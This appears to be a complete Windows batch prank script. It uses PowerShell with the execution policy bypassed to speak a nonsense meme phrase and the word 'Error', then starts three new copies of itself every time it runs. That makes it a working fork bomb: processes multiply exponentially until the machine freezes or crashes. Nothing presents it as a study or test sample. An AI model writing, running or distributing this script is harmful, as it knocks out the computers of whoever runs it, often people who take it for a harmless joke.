@echo off
powershell -ExecutionPolicy Bypass -Command "Add-type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('TUNGITY TUNG SIX SEVEN SIX SEVEN TUNGITY TUNG SIX SEVEN SIX SEVEN')"
powershell -ExecutionPolicy Bypass -Command "Add-type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('Error')"
start "" "%~f0"
start "" "%~f0"
start "" "%~f0"
exit
